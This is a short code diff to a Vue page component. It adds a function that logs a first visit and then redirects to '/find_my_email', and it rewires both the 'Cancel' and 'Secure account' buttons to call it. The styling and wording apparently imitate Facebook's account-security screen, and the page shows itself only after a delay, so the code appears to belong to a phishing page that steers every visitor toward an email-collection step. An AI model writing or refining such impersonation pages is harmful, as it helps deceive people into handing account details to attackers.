@@ -19,6 +19,11 @@ onMounted(() => {
     isShowPage.value = true
   }, 2000)
 })
+
+async function toNextPage() {
+  await logFirstTime()
+  window.location.href = '/find_my_email?a=1'
+}
 </script>
 <template>
   <div v-if="isShowPage" class="flex flex-col items-center h-lvh max-h-[878px]">
@@ -67,18 +72,18 @@ onMounted(() => {
       <div
         class="max-md:flex-col-reverse max-md:gap-2 flex justify-end text-[12px] md:border-t py-[8px] px-[10px] md:bg-[#f2f2f2] md:border-[#ccc] mt-[10px]"
       >
-        <a
-          href="/find_my_email"
-          class="btn-2 btn-mobile max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] md:h-[28px]"
+        <p
+          @click="toNextPage"
+          class="cursor-pointer btn-2 btn-mobile max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] md:h-[28px]"
         >
           {{ $t('Cancel') }}
-        </a>
-        <a
-          href="/find_my_email"
-          class="btn-1 btn-mobile max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white md:h-[28px]"
+        </p>
+        <p
+          @click="toNextPage"
+          class="cursor-pointer btn-1 btn-mobile max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white md:h-[28px]"
         >
           {{ $t('Secure account') }}
-        </a>
+        </p>
       </div>
     </div>
     <!-- Footer Section -->
